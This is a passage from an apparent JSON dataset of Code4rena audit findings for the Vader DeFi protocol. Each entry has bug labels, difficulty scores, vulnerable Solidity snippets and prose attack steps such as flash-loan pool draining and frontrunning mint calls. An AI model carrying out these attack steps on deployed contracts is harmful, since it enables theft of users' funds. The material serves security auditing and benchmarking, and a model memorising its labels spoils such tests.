TomFrenchBlockchain\",\n      \"Draining of funds fromVaderPool\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"See theVaderPool.mintSynthfunction:https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\",\n      \"As the pool‚Äôs reserves can be manipulated through flashloans similar to on UniswapV2, an attacker may set the exchange rate betweennativeAssetand synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\",\n      \"The attacker first flashloans and sells a huge amount offoreignAssetto the pool. The pool now thinksnativeAssetis extremely valuable.The attacker now uses a relatively small amount ofnativeAssetto mint synths usingVaderPool.mintSynth. As the pool thinksnativeAssetis very valuable the attacker will receive a huge amount of synths.The attacker can now manipulate the pool in the opposite direction by buying up theforeignAssetthey sold to the pool.nativeAssetis now back at its normal price, or perhaps artificially low if the attacker wishes.The attacker now burns all of their synths. AsnativeAssetis considered much less valuable than at the point the synths were minted it takes a lot more ofnativeAssetin order to pay out for the burned synths.\",\n      \"For the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount ofnativeAssetfrom the pool. This process can be repeated as long as it is profitable.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Prevent minting of synths or at the very least tie the exchange rate to a manipulation resistant oracle.\"\n    ]\n  },\n  {\n    \"row_number\": 90,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"TwapOracle doesnÈà•Ê™õ calculate VADER:USDV exchange rate correctly\\\"\",\n    \"line\": \"TwapOracle[156]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-04-twaporacle-doesnt-calculate-vaderusdv-exchange-rate-correctly\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain\",\n      \"Detailed description of the impact of this finding.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L156\",\n      \"On L156 ofTwapOraclewe perform the calculation:\",\n      \"result = ((sumUSD * IERC20Metadata(token).decimals()) / sumNative);\",\n      \"This seems extremely odd as for an 18 decimal token we‚Äôre then calculating\",\n      \"result = ((sumUSD * 18) / sumNative);\",\n      \"This is just plain weird. I expect what was meant is to replace this line with the below so we‚Äôre properly scaling fortoken‚Äôs number of decimals.\",\n      \"uint256 scalingFactor = 10 ** IERC20Metadata(token).decimals()\\nresult = (sumUSD * scalingFactor) / sumNative;\",\n      \"Marked as high severity as this exchange rate appears to be used insome form of minting mechanismand correctness of the oracle is listed as one of the key focuses of the audit.\"\n    ],\n    \"recommended_mitigation\": [\n      \"As above.\",\n      \"SamSteinGG (Vader) confirmed\",\n      \"The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\"\n    ]\n  },\n  {\n    \"row_number\": 91,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.\\\"\",\n    \"line\": \"VaderRouterV2[208,237],VaderMath[73]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-05-lps-of-vaderpoolv2-can-manipulate-pool-reserves-to-extract-funds-from-the-reserve\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by WatchPug\",\n      \"Impermanent loss protection can be exploited to drain the reserve.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"InVaderPoolV2.burnwe calculate the current losses that the LP has made to impermanent loss.\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L237-L269\",\n      \"These losses are then refunded to the LP in VADER tokens from the reserve\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L208-L227\",\n      \"This loss is calculated by the current reserves of the pool so if an LP can manipulate the pool‚Äôs reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93\",\n      \"The attack is then as follows.\",\n      \"Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)Flashloan a huge amount of one of the pool‚Äôs assets.Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.Remove your liquidity and receive compensation from the reserve for the IL you have engineered.Re-add your liquidity back to the pool.Trade against the pool to bring it back into balance.\",\n      \"The attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.\",\n      \"This is a high risk issue as after a year any large LP is incentivised and able to perform this attack.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use a manipulation resistant oracle for the relative prices of the pool‚Äôs assets (TWAP, etc.)\"\n    ]\n  },\n  {\n    \"row_number\": 92,\n    \"bug_id\": \" H-09\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"VaderPoolV2 incorrectly calculates the amount of IL protection to send to LPs\\\"\",\n    \"line\": \"TwapOracle[281],BasePoolV2[58],VaderPoolV2[258],VaderReserve[76],VaderMath[73]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-09-vaderpoolv2-incorrectly-calculates-the-amount-of-il-protection-to-send-to-lps\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain\",\n      \"TheVaderReservepays out IL fromVaderPoolV2LPs expressed in USDV with VADER (assuming a 1:1 exchange rate)\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"From the TwapOracle, it can be seen thatVaderPoolV2is intended to be deployed with USDV as itsnativeAsset:\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L281-L296https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/BasePoolV2.sol#L58-L59\",\n      \"All the pairs inVaderPoolV2are then USDV:TKN where TKN is some other token, exactly which is irrelevant in this case.\",\n      \"VaderPoolV2offers IL protection where any IL is refunded from theVaderReserve\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L258-L268\",\n      \"TheVaderReserveholds a balance of VADER tokens which will be used to pay out this protection.\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/reserve/VaderReserve.sol#L76-L90\",\n      \"The IL experienced by the LP is calculated inVaderMath.calculateLoss\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93\",\n      \"This is the core of the issue. From the variable names it‚Äôs clear that this is written with the assumption that it is work on units of VADER whereas it is provided amounts in terms of USDV. CheckingVaderRouterV2we can see that we pass the output of this calculation directly to the reserve in order to claim VADER.\",\n      \"If an LP experienced 100 USDV worth of IL, instead of claiming the equivalent amount of VADER they would receive exactly 100 VADER as there‚Äôs no handling of the exchange rate between USDV and VADER.\",\n      \"As VADER and USDV are very unlikely to trade at parity LPs could get sustantially more or less than the amount of IL they experienced.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add handling for the conversion rate between VADER and USDV using a tamper resistant oracle (TwapOracle could potentially fulfil this role).\",\n      \"SamSteinGG (Vader) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 93,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"calculate Loss is vulnerable to flashloan attack\\\"\",\n    \"line\": \"VaderMath[69]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-10--calculate-loss-is-vulnerable-to-flashloan-attack\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005\",\n      \"The VaderPool would compensate users‚Äô IL. The formula it uses to calculate lp value is vulnerable to manipulation.\",\n      \"The formula to calculate the lp value is similar to warp finance which is known to be unsafe.warpfinance-incident-root-cause-analysis(Please to refer to the POC section)\",\n      \"The Attacker can purchase an old lp position, manipulate price, take IL compensation and drain the reserve.\\nI consider this is a high-risk issue.\",\n      \"None\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"VaderMath.sol#L69-L93\",\n      \"The lp value is calculated as[(A0 * P1) + V0]and// [(A1 * P1) + V1].\\nAssume that there‚Äôs an ETH pool and there‚Äôs 100 ETH and 100 Vader in the pool.\",\n      \"Attacker deposit 1 ETH and 1 Vader and own 1% of the liquidity.Wait 1 yearStart flash loan and buy a lot ETH with 99900 Vader.There‚Äôs  0.1 ETH 100,000 Vader in the pool.Burn 1 % lp at the price 1 ETH = 1,000,000 Vader.A0 * P1 + V0 = 1 (eth) * 1,000,000 (price) + 100 (vader)A1 * P1 + V1 = 0.001 (eth) * 1,000,000 (price) + 10,000 (vader)IL compensation would be around9891000.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Please use the fair lp pricing formula from alpha finance instead.fair-lp-token-pricing\",\n      \"SamSteinGG (Vader) disputed:\",\n      \"The described attack scenario can not be executed as the pool would actually consume the flash loan. The CLP model follows a non-linear curve that actually diminishes in value as the trade size increases, meaning that at most 25% of the total assets in the pool can be drained at a given iteration. This, on top with the fees of each transaction render this attack vector impossible. Please request a tangible attack test from the warden if this is meant to be accepted as valid.\",\n      \"alcueca (judge) commented:\",\n      \"The CLP model isn‚Äôt mentioned in the readme or the whitepaper. The issue is valid according to the materials supplied.\",\n      \"SamSteinGG (Vader) commented:\",\n      \"@alcueca As the grading guidelines of C4 state, a documentation issue cannot constitute more than a low risk finding. We advise the severity to be lowered.\"\n    ]\n  },\n  {\n    \"row_number\": 94,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"(dex-v1) BasePool.mint() function can be frontrun\\\"\",\n    \"line\": \"BasePool[149]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-11-dex-v1-basepoolmint-function-can-be-frontrun\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by Reigada\",\n      \"In the contract BasePool the mint function can be frontrun. This will assign the NFT to the attacker which later on he can burn it retrieving the corresponding\\\\_nativeAssetand\\\\_foreignAssetinitially deposited by the frontrun victim.https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194\",\n      \"Manual testing\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"User1 transfers 1000\\\\_nativeAssettokens and 1000\\\\_foreignAssettokens into the BasePool contract.\\nUser1 calls theBasePool.mint()function to retrieve his NFT.\\nAttacker is constantly polling for an increase of the balance of\\\\_nativeAssetand\\\\_foreignAssetof the contract OR attacker is constantly scanning the mempool formint()function calls.\\nAttacker detects an increase of balance of\\\\_nativeAssetand\\\\_foreignAssetOR attacker detects amint()function call in the mempool.\\nAttacker frontruns the mint call and retrieves the NFT. Gets a NFT that is worth 1000\\\\_nativeAssetsand 1000\\\\_foreignAssets.\\nUser1 gets a NFT that is worth 0\\\\_nativeAssetsand 0\\\\_foreignAssets.\\nAttacker burns the NFT retrieving the corresponding\\\\_nativeAssetand\\\\_foreignAssetinitially deposited by the victim.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Include in themint()function the transfer of\\\\_nativeAssetsand\\\\_foreignAssetsto the smart contract.\",\n      \"SamSteinGG (Vader) disputed:\",\n      \"The pool is meant to be utilized via the router or smart contracts and is not meant to be utilized directly.  The exact same ‚Äúflaw‚Äù exists in Uniswap V2 whereby if you transfer assets directly someone else can claim them on your behalf.\",\n      \"alcueca (judge) commented:\",\n      \"Ah, so this how you prevent direct access to the pools. The issue is valid due to lack of documentation on the usage of the router.\",\n      \"SamSteinGG (Vader) commented:\",\n      \"Firstly, documentation related issues cannot constitute a high risk vulnerability. Secondly, this type of documentation does not exist in Uniswap V2 either. We advise this finding to be set to no risk.\"\n    ]\n  },\n  {\n    \"row_number\": 95,\n    \"bug_id\": \" H-13\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone Can Arbitrarily Mint Synthetic Assets In VaderPoolV2.mintSynth()\\\"\",\n    \"line\": \"VaderPoolV2[126]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-13-anyone-can-arbitrarily-mint-synthetic-assets-in-vaderpoolv2mintsynth\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"ThemintSynth()function is callable by any user and creates a synthetic asset againstforeignAssetif it does not already exist. The protocol expects a user to first approve the contract as a spender before callingmintSynth(). However, any arbitrary user could monitor the blockchain for contract approvals that matchVaderPoolV2.soland effectively frontrun their call tomintSynth()by setting thetoargument to their own address. As a result, thenativeDepositamount is transferred from the victim, and a synthetic asset is minted and finally transferred to the malicious user who is represented by thetoaddress.\",\n      \"Manual code review.\\nDiscussions with dev.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider removing thefromargument inmintSynth()and update thesafeTransferFrom()call to instead transfer frommsg.sender.\",\n      \"SamSteinGG (Vader) commented:\",\n      \"The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\"\n    ]\n  },\n  {\n    \"row_number\": 96,\n    \"bug_id\": \" H-14\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone Can Arbitrarily Mint Fungible Tokens In VaderPoolV2.mintFungible()\\\"\",\n    \"line\": \"VaderPoolV2[284]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-14-anyone-can-arbitrarily-mint-fungible-tokens-in-vaderpoolv2mintfungible\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"ThemintFungible()function is callable by any user that wishes to mint liquidity pool fungible tokens. The protocol expects a user to first approve the contract as a spender before callingmintFungible(). However, any arbitrary user could monitor the blockchain for contract approvals that matchVaderPoolV2.soland effectively frontrun their call tomintFungible()by setting thetoargument to their own address. As a result, thenativeDepositandforeignDepositamounts are transferred from the victim, and LP tokens are minted and finally transferred to the malicious user who is represented by thetoaddress.\",\n      \"Manual code review.\\nDiscussions with dev.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider removing thefromargument inmintFungible()and update thesafeTransferFrom()calls to instead transfer frommsg.sender.\",\n      \"SamSteinGG (Vader) disputed:\",\n      \"The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\",\n      \"alcueca (judge) commented:\",\n      \"You need to enforce that somehow.\",\n      \"SamSteinGG (Vader) confirmed:\",\n      \"Upon second consideration, the functions relating to the minting of synths and wrapped tokens should have had the onlyRouter modifier and thus are indeed vulnerable. Issue accepted.\"\n    ]\n  },\n  {\n    \"row_number\": 97,\n    \"bug_id\": \" H-15\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"VaderRouter._swap performs wrong swap\\\"\",\n    \"line\": \"VaderRouter[304]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-15-vaderrouter_swap-performs-wrong-swap\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The 3-path hop inVaderRouter._swapis supposed to first swapforeignassets to native assets, and then the received native assets to different foreign assets again.\",\n      \"Thepool.swap(nativeAmountIn, foreignAmountIn)accepts the foreign amount as thesecondargument.\\nThe code however mixes these positional arguments up and tries to perform apool0foreign -> native swap by using theforeignamount as thenative amount:\",\n      \"All 3-path swaps through theVaderRouterfail in the pool check whenrequire(nativeAmountIn = amountIn <= nativeBalance - nativeReserve = 0)is checked, as foreign amount is sent butnativeamount is specified.\"\n    ],\n    \"code_blocks\": [\n      \"function\\n_swap\\n(\\nuint256\\namountIn\\n,\\naddress\\n[]\\ncalldata\\npath\\n,\\naddress\\nto\\n)\\nprivate\\nreturns\\n(\\nuint256\\namountOut\\n) {\\nif\\n(\\npath\\n.\\nlength\\n==\\n3\\n) {\\n// ...\\n// @audit calls this with nativeAmountIn = amountIn. but should be foreignAmountIn (second arg)\\nreturn\\npool1\\n.\\nswap\\n(\\n0\\n,\\npool0\\n.\\nswap\\n(\\namountIn\\n,\\n0\\n,\\naddress\\n(\\npool1\\n)),\\nto\\n);\\n}\\n}\\n// @audit should be this instead\\nreturn\\npool1\\n.\\nswap\\n(\\npool0\\n.\\nswap\\n(\\n0\\n,\\namountIn\\n,\\naddress\\n(\\npool1\\n)),\\n0\\n,\\nto\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Usereturn pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);instead.\",\n      \"SamSteinGG (sponsor) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 98,\n    \"bug_id\": \" H-16\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"VaderRouter.calculateOutGivenIn calculates wrong swap\\\"\",\n    \"line\": \"VaderRouter[453]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-16-vaderroutercalculateoutgivenin-calculates-wrong-swap\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The 3-path hop inVaderRouter.calculateOutGivenInis supposed to first swapforeignassets to native assetsin pool0, and then the received native assets to different foreign assets againin pool1.\",\n      \"The first argument ofVaderMath.calculateSwap(amountIn, reserveIn, reserveOut)must refer to the same token as the second argumentreserveIn.\\nThe code however mixes these positions up and first performs a swap inpool1instead ofpool0:\",\n      \"All 3-path swaps computations throughVaderRouter.calculateOutGivenInwill return the wrong result.\\nSmart contracts or off-chain scripts/frontends that rely on this value to trade will have their transaction reverted, or in the worst case lose funds.\"\n    ],\n    \"code_blocks\": [\n      \"function\\ncalculateOutGivenIn\\n(\\nuint256\\namountIn\\n,\\naddress\\n[]\\ncalldata\\npath\\n)\\nexternal\\nview\\nreturns\\n(\\nuint256\\namountOut\\n)\\n{\\nif\\n(...) {\\n}\\nelse\\n{\\nreturn\\nVaderMath\\n.\\ncalculateSwap\\n(\\nVaderMath\\n.\\ncalculateSwap\\n(\\n// @audit the inner trade should not be in pool1 for a forward swap. amountIn foreign => next param should be foreignReserve0\\namountIn\\n,\\nnativeReserve1\\n,\\nforeignReserve1\\n),\\nforeignReserve0\\n,\\nnativeReserve0\\n);\\n}\\n/** @audit instead should first be trading in pool0!\\nVaderMath.calculateSwap(\\nVaderMath.calculateSwap(\\namountIn,\\nforeignReserve0,\\nnativeReserve0\\n),\\nnativeReserve1,\\nforeignReserve1\\n);\\n*/\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Return the following code instead which first trades inpool0and then inpool1:\",\n      \"return\\nVaderMath\\n.\\ncalculateSwap\\n(\\nVaderMath\\n.\\ncalculateSwap\\n(\\namountIn\\n,\\nforeignReserve0\\n,\\nnativeReserve0\\n),\\nnativeReserve1\\n,\\nforeignReserve1\\n);\",\n      \"SamSteinGG (Vader) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 99,\n    \"bug_id\": \" H-18\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Attacker can claim more IL by manipulating pool price then removeLiquidity\\\"\",\n    \"line\": \"VaderRouterV2[227]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-18-attacker-can-claim-more-il-by-manipulating-pool-price-then-removeliquidity-\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gzeon\",\n      \"Vader reimburse user IL immediately when user withdraw from the pool (VaderRouterV2.sol:L227), an attacker can therefore manipulate the pool balance causing a high IL, remove liquidity and restore the pool balance such that he will receive a larger IL reimbursement.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Let‚Äôs assume our attacker own 100% of FOO-VADER\",\n      \"Attacker add 100 FOO and 100 VADER to the Poolwait some block, or 1 year for max IL protectionIn 1 transaction, attackerSwap 9900 FOO to 99 VaderPool now have 10000 FOO and 1 VADERBy VaderMath.sol:L84 the loss is 100*1/10000+100-2 = 98.01 VADERRemove liquidity and receive 10000 FOO and 99.01 VADERRestore the pool balanceSuch that the attacker will gain 98.01 VADER without risk\",\n      \"The profit is constrained by gas cost, pool fee, % of pool controlled by the attacker and % of IL protection.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use twap price to determine P1 in VaderMath.sol:L84 when calculating IL to reduce risk of manipulation\",\n      \"SamSteinGG (Vader) commented:\",\n      \"Duplicate of #2\",\n      \"alcueca (judge) commented:\",\n      \"Doesn‚Äôt seem like a duplicate to me, @SamSteinGG?\",\n      \"SamSteinGG (Vader) commented:\",\n      \"@alcueca The stated trade cannot occur as trades are inherently limited by the CLP design of the protocol to one third of the available pair liquidity. As such, the illustrated pair would actually result in almost zero units retrieved back.\"\n    ]\n  },\n  {\n    \"row_number\": 100,\n    \"bug_id\": \" H-21\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Lack of access control allow attacker to mintFungible() and mintSynth() with other userÈà•Ê™ö wallet balance\\\"\",\n    \"line\": \"VaderPoolV2[126,284]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-21-lack-of-access-control-allow-attacker-to-mintfungible-and-mintsynth-with-other-users-wallet-balance\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\",\n      \"Funds are transferred from thefromparameter, and the output tokens are transferred to thetoparameter, both passed by the caller without proper access control.\",\n      \"This issue allows anyone to callmintFungible()andmintSynth()and steal almost all their wallet balances for all the users who have approved the contract before.\",\n      \"SamSteinGG (Vader) commented:\",\n      \"alcueca (judge) commented:\",\n      \"SamSteinGG (Vader) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\nmintFungible\\n(\\nIERC20\\nforeignAsset\\n,\\nuint256\\nnativeDeposit\\n,\\nuint256\\nforeignDeposit\\n,\\naddress\\nfrom\\n,\\naddress\\nto\\n)\\nexternal\\noverride\\nnonReentrant\\nreturns\\n(\\nuint256\\nliquidity\\n) {\\nIERC20Extended\\nlp\\n=\\nwrapper\\n.\\ntokens\\n(\\nforeignAsset\\n);\\nrequire\\n(\\nlp\\n!=\\nIERC20Extended\\n(\\n_ZERO_ADDRESS\\n),\\n\\\"VaderPoolV2::mintFungible: Unsupported Token\\\"\\n);\\n(\\nuint112\\nreserveNative\\n,\\nuint112\\nreserveForeign\\n, ) =\\ngetReserves\\n(\\nforeignAsset\\n);\\n// gas savings\\nnativeAsset\\n.\\nsafeTransferFrom\\n(\\nfrom\\n,\\naddress\\n(\\nthis\\n),\\nnativeDeposit\\n);\\nforeignAsset\\n.\\nsafeTransferFrom\\n(\\nfrom\\n,\\naddress\\n(\\nthis\\n),\\nforeignDeposit\\n);\\nPairInfo\\nstorage\\npair\\n=\\npairInfo\\n[\\nforeignAsset\\n];\\nuint256\\ntotalLiquidityUnits\\n=\\npair\\n.\\ntotalSupply\\n;\\nif\\n(\\ntotalLiquidityUnits\\n==\\n0\\n)\\nliquidity\\n=\\nnativeDeposit\\n;\\nelse\\nliquidity\\n=\\nVaderMath\\n.\\ncalculateLiquidityUnits\\n(\\nnativeDeposit\\n,\\nreserveNative\\n,\\nforeignDeposit\\n,\\nreserveForeign\\n,\\ntotalLiquidityUnits\\n);\\nrequire\\n(\\nliquidity\\n>\\n0\\n,\\n\\\"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\\\"\\n);\\npair\\n.\\ntotalSupply\\n=\\ntotalLiquidityUnits\\n+\\nliquidity\\n;\\n_update\\n(\\nforeignAsset\\n,\\nreserveNative\\n+\\nnativeDeposit\\n,\\nreserveForeign\\n+\\nforeignDeposit\\n,\\nreserveNative\\n,\\nreserveForeign\\n);\\nlp\\n.\\nmint\\n(\\nto\\n,\\nliquidity\\n);\\nemit\\nMint\\n(\\nfrom\\n,\\nto\\n,\\nnativeDeposit\\n,\\nforeignDeposit\\n);\\n}\"\n    ],\n    \"quotes\": [\n      \"Duplicate #67\",\n      \"Not a duplicate.\",\n      \"@alcueca Can you elaborate as to why it is not a duplicate?\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 101,\n    \"bug_id\": \" H-22\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"mintSynth() and burnSynth() can be front run\\\"\",\n    \"line\": \"VaderPoolV2[126,179]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-22-mintsynth-and-burnsynth-can-be-front-run\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L155\",\n      \"https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L179-L197\",\n      \"Given thatmintSynth()andburnSynth()will issue and redeem assets based on the price of the pool (reserves), and they will create price impact based on the volume being minted and burnt.\",\n      \"However, the current implementation provides no parameter for slippage control, making them vulnerable to front-run attacks. Especially for transactions with rather large volumes.\",\n      \"Consider adding aminAmountOutparameter.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 102,\n    \"bug_id\": \" H-23\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Synth tokens can get over-minted\\\"\",\n    \"line\": \"VaderPoolV2[126,179]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-23-synth-tokens-can-get-over-minted\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"Per the document:\",\n      \"However, in the current implementation,Synthtokens are minted based on the calculation result. WhilenativeDepositbe added to the reserve,reserveForeignwill remain unchanged, not deducted nor locked.\",\n      \"Making it possible forSynthtokens to get over-minted.\",\n      \"The Vader pool for BTC-USDV is newly created, with nearly 0 liquidity.\",\n      \"Alice add liquidity with100,000 USDVand1 BTC;\",\n      \"BobmintSynth()with100,000 USDV, got0.25 BTC vSynth;\",\n      \"Alice remove all the liquidity received at step 1, got all the200k USDVand1 BTC.\",\n      \"The0.25 BTC vSynthheld by Bob is now backed by nothing and unable to be redeemed.\",\n      \"This also makes it possible for a sophisticated attacker to steal funds from the Vader pool.\",\n      \"The attacker may do the following in one transaction:\",\n      \"Add liquidity with10 USDVand10,000 BTC(flash loan);\",\n      \"CallmintSynth()with10 USDV, repeat for 10 times, got1461 BTC vSynth;\",\n      \"Remove liquidity and repay flash loan, keep the1461 BTC vSynth;\",\n      \"Wait for other users to add liquidity and when the BTC reserve is sufficient, callburnSynth()to stealUSDVfrom the pool.\",\n      \"SamSteinGG (Vader) confirmed\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"It also is capable of using liquidity units as collateral for synthetic assets, of which it will always have guaranteed redemption liquidity for.\",\n      \"Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:The code deviates from the Thorchain implementationA test case is created that illustrates the problem\",\n      \"While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 103,\n    \"bug_id\": \" H-25\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong design of swap() results in unexpected and unfavorable outputs\\\"\",\n    \"line\": \"VaderMath[99]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-25-wrong-design-of-swap-results-in-unexpected-and-unfavorable-outputs\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"The current formula to calculate theamountOutfor a swap is:\",\n      